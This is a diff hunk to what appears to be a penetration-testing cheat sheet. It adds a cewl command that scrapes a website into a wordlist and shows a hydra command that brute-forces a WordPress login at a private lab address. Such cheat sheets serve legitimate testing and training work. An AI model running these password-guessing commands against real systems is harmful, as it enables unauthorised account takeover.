@@ -1651,6 +1651,11 @@ C:\Windows\system32>
 ### Hydra
 
 ```
+# get a keywords list in case of
+cewl http://xxx.yyy >> cewl.txt
+```
+
+```
 hydra -l ben -P /wordlists/rockyou.txt 192.168.133.52 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.133.52%2Fwp-admin%2F&testcookie=1:F=is incorrect:H=Cookie: wordpress_test_cookie=WP+Cookie+check" -V -I
 ```
 
